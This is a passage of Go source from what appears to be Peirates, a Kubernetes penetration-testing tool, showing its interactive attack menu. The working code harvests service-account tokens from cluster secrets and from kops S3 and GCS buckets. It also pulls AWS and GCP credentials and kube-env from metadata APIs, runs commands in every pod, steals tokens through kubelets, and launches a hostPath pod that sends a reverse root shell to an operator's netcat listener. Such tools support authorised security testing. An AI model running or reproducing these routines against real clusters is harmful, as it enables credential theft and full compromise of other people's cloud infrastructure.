				println("\n[1] Switch to this service account\n[2] Maintain current service account")
				fmt.Scanln(&input)
				switch input {
				case "1":
					assignServiceAccountToConnection(serviceAccount, &connectionString)
					break
				case "2":
					break
				default:
					println("Input not understood - adding service account but not switching context")
				}
				println("")
			case "4", "import":
				serviceAccountJSON, err := json.Marshal(serviceAccounts)
				if err != nil {
					fmt.Printf("[-] Error exporting service accounts: %s\n", err.Error())
				} else {
					println(string(serviceAccountJSON))
				}
			case "5", "export":
				var newServiceAccounts []ServiceAccount
				err := json.NewDecoder(os.Stdin).Decode(&newServiceAccounts)
				if err != nil {
					fmt.Printf("[-] Error importing service accounts: %s\n", err.Error())
				} else {
					serviceAccounts = append(serviceAccounts, newServiceAccounts...)
					fmt.Printf("[+] Successfully imported service accounts\n")
				}
			}

		// [2] List namespaces or change namespace
		case "2", "ns-menu", "namespace-menu", "ns", "namespace":
			println(`
			[1] List namespaces [list]
			[2] Switch namespace [switch]
			`)
			fmt.Scanln(&input)
			switch input {
			case "1", "list":
				Namespaces = PrintNamespaces(connectionString)
				break
			case "2", "switch":
				Namespaces = PrintNamespaces(connectionString)
				SwitchNamespace(&connectionString)
				break
			default:
				break
			}

		// [3] Get list of pods
		case "3", "get-pods", "list-pods":
			println("\n[+] Printing a list of Pods in this namespace......")
			printListOfPods(connectionString)
			break

		//[4] Get complete info on all pods (json)
		case "4", "dump-podinfo", "dump-pod-info":
			GetPodsInfo(connectionString, &podInfo)
			break

		//	[6] Enter AWS IAM credentials manually [enter-aws-credentials]
		case "6", "enter-aws-credentials", "aws-creds":
			credentials, err := EnterIamCredentialsForAWS()
			if err != nil {
				break
			}

			awsCredentials = credentials
			println(" New AWS credentials are: \n")
			DisplayAWSIAMCredentials(awsCredentials)

			break

		// [7] Attempt to Assume a Different AWS Role [aws-assume-role]
		case "7", "aws-assume-role":

			// Get role to assume
			var input string
			println("[+] Enter a role to assume, in the format arn:aws:iam::123456789012:role/roleName : ")
			fmt.Scanln(&input)

			matched, _ := regexp.MatchString(`arn:aws:iam::\d{12,}:\w+\/\w+`, input)
			if !matched {

				println("String entered isn't a AWS role name in the format requested.\n")
				break
			}
			roleToAssume := strings.TrimSpace(input)

			// Attempt to assume role.
			roleAssumption, err := AWSSTSAssumeRole(awsCredentials, roleToAssume)
			if err != nil {
				break
			}

			assumedAWSrole = roleAssumption

		// [8] Deactivate assumed AWS role [aws-empty-assumed-role]
		case "8", "aws-empty-assumed-role":
			assumedAWSrole.AccessKeyId = ""
			assumedAWSrole.accountName = ""

		//	[10] Get secrets from API server
		case "10", "list-secrets":
			secrets, serviceAccountTokens := getSecretList(connectionString)
			for _, secret := range secrets {
				println("[+] Secret found: ", secret)
			}
			for _, svcAcct := range serviceAccountTokens {
				println("[+] Service account found: ", svcAcct)
			}
			break

		// [11] Get a service account token from a secret
		case "11", "get-secret", "secret-to-sa":
			println("\nPlease enter the name of the secret for which you'd like the contents: ")
			var secretName string
			fmt.Scanln(&secretName)

			if !kubectlAuthCanI(connectionString, "get", "secret") {
				println("[-] Permission Denied: your service account isn't allowed to get secrets")
				break
			}

			secretJSON, _, err := runKubectlSimple(connectionString, "get", "secret", secretName, "-o", "json")
			if err != nil {
				println("[-] Could not retrieve secret")
				break
			}

			var secretData map[string]interface{}
			json.Unmarshal(secretJSON, &secretData)

			secretType := secretData["type"].(string)

			if secretType != "kubernetes.io/service-account-token" {
				println("[-] This secret is not a service account token.")
				break
			}

			opaqueToken := secretData["data"].(map[string]interface{})["token"].(string)
			token, err := base64.StdEncoding.DecodeString(opaqueToken)
			if err != nil {
				println("[-] ERROR: couldn't decode")
				break
			} else {
				fmt.Printf("[+] Saved %s // %s\n", secretName, token)
				serviceAccounts = append(serviceAccounts, makeNewServiceAccount(secretName, string(token), "Cluster Secret"))
			}

		// [5] Check all pods for volume mounts
		case "5", "find-volume-mounts", "find-mounts":
			println("[1] Get all host mount points [all]")
			println("[2] Get volume mount points for a specific pod [single]")
			println("\nPeirates:># ")
			fmt.Scanln(&input)

			GetPodsInfo(connectionString, &podInfo)

			switch input {
			case "1", "all":
				println("[+] Getting volume mounts for all pods")
				// BUG: Need to make it so this Get doesn't print all info even though it gathers all info.
				PrintHostMountPoints(podInfo)

				//MountRootFS(allPods, connectionString)
			case "2", "single":
				println("[+] Please provide the pod name: ")
				fmt.Scanln(&userResponse)
				fmt.Printf("[+] Printing volume mount points for %s\n", userResponse)
				PrintHostMountPointsForPod(podInfo, userResponse)
			}

		// [20] Gain a reverse rootshell by launching a hostPath / pod
		case "20", "attack-pod-hostpath-mount", "attack-hostpath-mount", "attack-pod-mount", "attack-hostmount-pod", "attack-mount-pod":
			allPods := getPodList(connectionString)

			println("Your IP addresses: ")
			GetMyIPAddressesNative()

			println("What IP and Port will your netcat listener be listening on?")
			var ip, port string
			println("IP:")
			fmt.Scanln(&ip)
			println("Port:")
			fmt.Scanln(&port)
			// TODO: Rename/refactor MountRootFS so we get more capabilities in case the node does not run cron
			MountRootFS(allPods, connectionString, ip, port)
			break

		// [12] Request IAM credentials from AWS Metadata API [AWS only]
		case "12", "get-aws-token":
			// Pull IAM credentials from the Metadata API, store in a struct and display

			result, err := PullIamCredentialsFromAWS()
			if err != nil {
				println("[-] Operation failed.")
				break
			}

			awsCredentials = result
			DisplayAWSIAMCredentials(awsCredentials)

			break

		// [13] Request IAM credentials from GCP Metadata API [GCP only]
		case "13", "get-gcp-token":

			// Make a request for our service account(s)
			var headers []HeaderLine
			headers = []HeaderLine{
				HeaderLine{"Metadata-Flavor", "Google"},
			}
			svcAcctListRaw := GetRequest("http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/", headers, false)
			if (svcAcctListRaw == "") || (strings.HasPrefix(svcAcctListRaw, "ERROR:")) {
				break
			}
			svcAcctListLines := strings.Split(string(svcAcctListRaw), "\n")

			for _, line := range svcAcctListLines {
				if strings.TrimSpace(string(line)) == "" {
					continue
				}
				account := strings.TrimRight(string(line), "/")
				fmt.Printf("\n[+] GCP Credentials for account %s\n\n", account)

				println(GetGCPBearerTokenFromMetadataAPI(account))
			}
			println(" ")
			break

		// [14] Request kube-env from GCP Metadata API [GCP only]
		case "14", "attack-kube-env-gcp":
			// Make a request for kube-env, in case it is in the instance attributes, as with a number of installers
			var headers []HeaderLine
			headers = []HeaderLine{
				HeaderLine{"Metadata-Flavor", "Google"},
			}
			kubeEnv := GetRequest("http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env", headers, false)
			if (kubeEnv == "") || (strings.HasPrefix(kubeEnv, "ERROR:")) {
				println("[-] Error - could not perform request http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env/")
				// TODO: Should we get error code the way we used to:
				// fmt.Printf("[-] Attempt to get kube-env script failed with status code %d\n", resp.StatusCode)
				break
			}
			kubeEnvLines := strings.Split(string(kubeEnv), "\n")
			for _, line := range kubeEnvLines {
				println(line)
			}

			break

		// [15] Pull Kubernetes service account tokens from Kop's bucket in GCS [GCP only]
		case "15", "attack-kops-gcs-1":
			var storeTokens string
			var placeTokensInStore bool

			println("[1] Store all tokens found in Peirates data store")
			println("[2] Retrieve all tokens - I will copy and paste")
			fmt.Scanln(&storeTokens)
			storeTokens = strings.TrimSpace(storeTokens)

			if storeTokens == "1" {
				placeTokensInStore = true
			}

			token := GetGCPBearerTokenFromMetadataAPI("default")
			if token == "ERROR" {
				println("[-] Could not get GCP default token from metadata API")
				break
			} else {
				println("[+] Got default token for GCP - preparing to use it for GCS:", token)
			}

			// Need to get project ID from metadata API
			var headers []HeaderLine
			headers = []HeaderLine{
				HeaderLine{"Metadata-Flavor", "Google"},
			}
			projectID := GetRequest("http://metadata.google.internal/computeMetadata/v1/project/numeric-project-id", headers, false)
			if (projectID == "") || (strings.HasPrefix(projectID, "ERROR:")) {
				break
			}
			println("[+] Got numberic project ID", projectID)

			// Get a list of buckets, maintaining the same header and adding two lines
			headers = []HeaderLine{
				HeaderLine{"Authorization", "Bearer " + token},
				HeaderLine{"Accept", "json"},
				HeaderLine{"Metadata-Flavor", "Google"}}

			// curl -s -H 'Metadata-Flavor: Google' -H "Authorization: Bearer $(cat bearertoken)" -H "Accept: json" https://www.googleapis.com/storage/v1/b/?project=$(cat projectid)
			urlListBuckets := "https://www.googleapis.com/storage/v1/b/?project=" + projectID
			bucketListRaw := GetRequest(urlListBuckets, headers, false)
			if (bucketListRaw == "") || (strings.HasPrefix(bucketListRaw, "ERROR:")) {
				break
			}
			bucketListLines := strings.Split(string(bucketListRaw), "\n")

			// Build our list of bucket URLs
			var bucketUrls []string
			for _, line := range bucketListLines {
				if strings.Contains(line, "selfLink") {
					url := strings.Split(line, "\"")[3]
					bucketUrls = append(bucketUrls, url)
				}
			}

			// In every bucket URL, look at the objects
			// Each bucket has a self-link line.  For each one, run that self-link line with /o appended to get an object list.
			// We use the same headers[] from the previous GET request.
		eachbucket:
			for _, line := range bucketUrls {
				println("Checking bucket for credentials:", line)
				urlListObjects := line + "/o"
				bodyListObjects := GetRequest(urlListObjects, headers, false)
				if (bodyListObjects == "") || (strings.HasPrefix(bodyListObjects, "ERROR:")) {
					continue
				}
				objectListLines := strings.Split(string(bodyListObjects), "\n")

				// Run through the object data, finding selfLink lines with URL-encoded /secrets/ in them.
				for _, line := range objectListLines {
					if strings.Contains(line, "selfLink") {
						if strings.Contains(line, "%2Fsecrets%2F") {
							objectURL := strings.Split(line, "\"")[3]
							// Find the substring that tells us this service account token's name
							start := strings.LastIndex(objectURL, "%2F") + 3
							serviceAccountName := objectURL[start:]
							println("\n[+] Getting service account for:", serviceAccountName)

							// Get the contents of the bucket to get the service account token
							saTokenURL := objectURL + "?alt=media"

							// We use the same headers[] from the previous GET request.
							bodyToken := GetRequest(saTokenURL, headers, false)
							if (bodyToken == "") || (strings.HasPrefix(bodyToken, "ERROR:")) {
								continue eachbucket
							}
							tokenLines := strings.Split(string(bodyToken), "\n")
							// TODO: Do we need to check status code?  if respToken.StatusCode != 200 {

							for _, line := range tokenLines {
								// Now parse this line to get the token
								encodedToken := strings.Split(line, "\"")[3]
								token, err := base64.StdEncoding.DecodeString(encodedToken)
								if err != nil {
									println("[-] Could not decode token.")
								} else {
									tokenString := string(token)
									println(tokenString)

									if placeTokensInStore {
										tokenName := "GCS-acquired: " + string(serviceAccountName)
										println("[+] Storing token as:", tokenName)
										serviceAccount := makeNewServiceAccount(tokenName, tokenString, "GCS Bucket")
										serviceAccounts = append(serviceAccounts, serviceAccount)

									}
								}

							}

						}
					}
				}
			}

			//
			// Don't forget to base64 decode with base64.StdEncoding.DecodeString()

			break

		// [16] Pull Kubernetes service account tokens from kops' S3 bucket (AWS only) [attack-kops-aws-1]
		case "16":
			var storeTokens string
			placeTokensInStore := false

			println("[1] Store all tokens found in Peirates data store")
			println("[2] Retrieve all tokens - I will copy and paste")
			fmt.Scanln(&storeTokens)
			storeTokens = strings.TrimSpace(storeTokens)

			if storeTokens == "1" {
				placeTokensInStore = true
			}

			if placeTokensInStore {
				println("Saving tokens to store")
			}

			// Hit the metadata API only if AWS creds aren't loaded already.
			var credentialsToUse AWSCredentials
			if len(assumedAWSrole.AccessKeyId) > 0 {
				credentialsToUse = assumedAWSrole
			} else if len(awsCredentials.AccessKeyId) > 0 {
				credentialsToUse = awsCredentials
			} else {
				println("Pulling AWS credentials from the metadata API.")
				result, err := PullIamCredentialsFromAWS()
				if err != nil {
					println("[-] Could not get AWS credentials from metadata API.")
					break
				}
				println("[+] Got AWS credentials from metadata API.")
				awsCredentials = result
				credentialsToUse = awsCredentials
			}

			println("[+] Preparing to use this AWS account to list and search S3 buckets: " + awsCredentials.AccessKeyId)

			result, err := ListAWSBuckets(credentialsToUse)
			if err != nil {
				println("Could not list buckets")
				break
			}
			listOfBuckets := result

			// Start a single S3 session
			svc := StartS3Session(credentialsToUse)

			// Look in every bucket for an oject that has a subdirectory called "secrets" in it.
			for _, bucket := range listOfBuckets {
				println("\n\n=============================================\n\n")
				println("Listing items in bucket " + bucket)

				// Get the list of items
				resp, err := svc.ListObjectsV2(&s3.ListObjectsV2Input{Bucket: aws.String(bucket)})
				if err != nil {
					println("Unable to list items in bucket %q, %v", bucket, err)
					break
				}

				for _, item := range resp.Contents {

					if strings.Contains(*item.Key, "/secrets/") {
						fmt.Println("Investigating bucket object for tokens:  " + *item.Key)

						result, err := svc.GetObject(&s3.GetObjectInput{
							Bucket: aws.String(bucket),
							Key:    aws.String(*item.Key),
						})

						if err != nil {
							continue
						}

						buf := new(bytes.Buffer)
						buf.ReadFrom(result.Body)
						jsonOutput := buf.String()
						byteEncodedJsonOutput := []byte(jsonOutput)
						// Unmarshall the json into Data : encodedtoken

						var structuredVersion AWSS3BucketObject

						json.Unmarshal(byteEncodedJsonOutput, &structuredVersion)
						encodedToken := structuredVersion.Data
						println("Encoded token: " + encodedToken)
						token, err := base64.StdEncoding.DecodeString(encodedToken)
						if err != nil {
							println("[-] Could not decode token.")
						} else {
							tokenString := string(token)
							println(tokenString)

							if placeTokensInStore {
								tokenName := "AWS-acquired: " + string(*item.Key)
								println("[+] Storing token as:", tokenName)
								serviceAccount := makeNewServiceAccount(tokenName, tokenString, "AWS Bucket")
								serviceAccounts = append(serviceAccounts, serviceAccount)
							}
						}

					}

				}
			}
			break

		case "17", "aws-s3-ls", "aws-ls-s3", "ls-s3", "s3-ls":
			// [17] List AWS S3 Buckets accessible (Auto-Refreshing Metadata API credentials) [AWS]

			var credentialsToUse AWSCredentials
			if len(assumedAWSrole.AccessKeyId) > 0 {
				credentialsToUse = assumedAWSrole
			} else if len(awsCredentials.AccessKeyId) > 0 {
				credentialsToUse = awsCredentials
			} else {
				println("Pulling AWS credentials from the metadata API.")
				result, err := PullIamCredentialsFromAWS()
				if err != nil {
					println("[-] Could not get AWS credentials from metadata API.")
					break
				}
				println("[+] Got AWS credentials from metadata API.")
				awsCredentials = result
				credentialsToUse = awsCredentials
			}

			result, err := ListAWSBuckets(credentialsToUse)
			if err != nil {
				println("List bucket operation failed.")
				break
			}

			for _, bucket := range result {
				println(bucket)
			}

			break

		case "18", "aws-s3-ls-objects", "aws-s3-list-objects", "aws-s3-list-bucket":
			// [18] List contents of an AWS S3 Bucket (Auto-Refreshing Metadata API credentials) [AWS]
			var bucket string

			println("Enter a bucket name to list: ")
			fmt.Scanln(&bucket)

			// Altering this to allow self-entered credentials.
			// var IAMCredentials = PullIamCredentialsFromAWS()
			if len(assumedAWSrole.AccessKeyId) > 0 {
				ListBucketObjects(assumedAWSrole, bucket)
			} else {
				ListBucketObjects(awsCredentials, bucket)
			}

			break

		case "19":
			break
		// [21] Run command in one or all pods in this namespace
		case "21", "exec-via-api":

			println("\n[1] Run command on a specific pod\n[2] Run command on all pods")
			fmt.Scanln(&input)
			println("[+] Please provide the command to run in the pods: ")

			cmdOpts.commandToRunInPods, _ = readLine()

			switch input {
			case "1":
				println("[+] Please provide the specified pod to run the command: ")
				fmt.Scanln(&cmdOpts.podsToRunTheCommandIn)
				var podToRunIn string
				fmt.Scanln(&podToRunIn)
				cmdOpts.podsToRunTheCommandIn = []string{podToRunIn}

				if cmdOpts.commandToRunInPods != "" {
					if len(cmdOpts.podsToRunTheCommandIn) > 0 {
						execInListPods(connectionString, cmdOpts.podsToRunTheCommandIn, cmdOpts.commandToRunInPods)
					}
				}
			case "2":
				var input string
				if cmdOpts.commandToRunInPods != "" {
					execInAllPods(connectionString, cmdOpts.commandToRunInPods)
				} else {
					fmt.Print("[-] ERROR - command string was empty.")
					fmt.Scanln(&input)
				}

			}
		// [22] Use the kubelet to gain the token in every pod where we can run a command
		case "22", "exec-via-kubelet", "exec-via-kubelets":
			ExecuteCodeOnKubelet(connectionString, &serviceAccounts)

		// [30] Inject peirates into another pod via API Server [inject-and-exec]
		case "30", "inject-and-exec":

			println("\nThis item has been removed from the menu and is currently not supported.\n")
			println("\nChoose a pod to inject peirates into:\n")
			runningPods := getPodList(connectionString)
			for i, listpod := range runningPods {
				fmt.Printf("[%d] %s\n", i, listpod)
			}

			println("Enter the number of a pod to inject peirates into: ")

			var choice int
			fmt.Scanln(&choice)

			podName := runningPods[choice]

			injectIntoAPodViaAPIServer(connectionString, podName)

		// [91] Make an HTTP request (GET or POST) to a URL of your choice [curl]
		case "91", "curl":
			println("[+] Enter a URL, including http:// or https:// - if parameters are required, you must provide them as part of the URL: ")
			fmt.Scanln(&input)

			// Trim whitespace
			fullURL := strings.TrimSpace(strings.ToLower(input))

			// Determine whether the URL is https or not:
			httpsPresent := false
			if strings.HasPrefix(fullURL, "https://") {
				httpsPresent = true
			} else {
				// Make sure the URL begins with http://, if it didn't begin with https://
				if !strings.HasPrefix(fullURL, "http://") {
					fmt.Println("This URL does not start with http:// or https://")
					break
				}
			}

			// TODO: Can we abstract the HTTP portion of this into http_utils.go
			//       the way we did with GetRequest()?

			// Set up an http client
			httpClient := &http.Client{}
			if httpsPresent {
				tr := &http.Transport{
					TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
				}
				httpClient = &http.Client{Transport: tr}
			}

			// Get the HTTP method
			method := "--undefined--"
			for (method != "GET") && (method != "POST") {
				fmt.Println("[+] Enter method - only GET and POST are supported: ")
				fmt.Scanln(&input)
				method = strings.TrimSpace(strings.ToUpper(input))
			}

			inputParameter := "--undefined--"

			// Store the parameters in a map
			params := map[string]string{}

			for inputParameter != "" {
				// Request a parameter name

				fmt.Println("[+] Enter a parameter or a blank line to finish entering parameters: ")
				input, _ = readLine()

				inputParameter = strings.TrimSpace(input)

				if inputParameter != "" {
					// Request a parameter value
					fmt.Println("[+] Enter a value for " + inputParameter + ":")
					fmt.Scanln(&input)

					// Add the parameter pair to the list
					params[inputParameter] = url.QueryEscape(input)
				}

			}

			// Store the headers in a list
			var headers []HeaderLine

			inputHeader := "undefined"

			fmt.Println("[+] Specify custom header lines, if desired, entering the Header name, hitting Enter, then the Header value.")
			for inputHeader != "" {
				// Request a header name

				fmt.Println("[+] Enter a header name or a blank line if done: ")
				input, _ = readLine()

				inputHeader = strings.TrimSpace(input)

				if inputHeader != "" {
					// Request a header rhs (value)
					fmt.Println("[+] Enter a value for " + inputHeader + ":")
					input, _ = readLine()

					// Add the header value to the list
					var header HeaderLine
					header.LHS = inputHeader
					header.RHS = input
					headers = append(headers, header)
				}

			}

			////// START thing to be abstracted
			// Store a URL starting point
			urlWithData := fullURL

			// Create a data structure for values sent in the body of the request.

			var dataSection *strings.Reader = nil
			var contentLength string

			// Construct GET or POST request based on variables
			if method == "GET" {

				// If there are parameters, add them to the end of urlWithData
				if len(params) > 0 {
					queryString := "?"

					for key, value := range params {
						queryString = queryString + key + "=" + value + "&"
					}
					// Strip the final & off the query string
					urlWithData = fullURL + strings.TrimSuffix(queryString, "&")
				}

			} else if method == "POST" {

				data := url.Values{}
				for key, value := range params {
					fmt.Printf("key[%s] value[%s]\n", key, value)
					data.Set(key, value)
				}
				encodedData := data.Encode()
				dataSection = strings.NewReader(encodedData)
				contentLength = strconv.Itoa(len(encodedData))

			} else {
				fmt.Println("ERROR: method " + method + " is not GET or POST - we shouldn't get here.")
				break
			}

			fmt.Println("[+] Using method " + method + " for URL " + urlWithData)

			// Build the request, adding in any headers found so far.
			request, err := http.NewRequest(method, fullURL, nil)
			for _, header := range headers {
				request.Header.Add(header.LHS, header.RHS)
			}

			// For posts, we replace the request -- can we combine the code
			// just above with this code by getting the request variable scoped
			// outside this if block?
			if method != "GET" {
				request, err = http.NewRequest(method, fullURL, dataSection)
				for _, header := range headers {
					request.Header.Add(header.LHS, header.RHS)
				}

				request.Header.Add("Content-Length", contentLength)
			}

			response, err := httpClient.Do(request)

			////// END thing to be abstracted

			if err != nil {
				fmt.Printf("[-] Error - could not perform request --%s-- - %s\n", fullURL, err.Error())
				response.Body.Close()
				continue
			}
			if response.Status != "200 OK" {
				fmt.Printf("[-] Error - response code: %s\n", response.Status)
				continue
			}
			defer response.Body.Close()
			responseBody, err := ioutil.ReadAll(response.Body)
			responseBodyString := string(responseBody)
			println(responseBodyString)
			println("")
		// [92] Deactivate "auth can-i" checking before attempting actions [set-auth-can-i]
		case "92", "set-auth-can-i":
			// Toggle UseAuthCanI between true and false
			println("\nWhen Auth-Can-I is set to true, Peirates uses the kubectl auth can-i feature to determine if an action is permitted before taking it.")
			println("Toggle this to false if auth can-i results aren't accurate for this cluster.")
			println("Auth-Can-I is currently set to ", UseAuthCanI)
			println("\nPlease choose a new value for Auth-Can-I:")
			println("[true] Set peirates to check whether an action is permitted")
			println("[false] Set peirates to skip the auth can-i check")
			println("[exit] Leave the setting at its current value")

			println("\nChoice: ")

			fmt.Scanln(&input)

			switch strings.ToLower(input) {
			case "exit":
				continue
			case "true", "1", "t":
				UseAuthCanI = true
			case "false", "0", "f":
				UseAuthCanI = false
			}

		case "98":
			break
		case "99":
			break
		default:
			fmt.Println("Command unrecognized.")
		}

		clearScreen()
	}
}
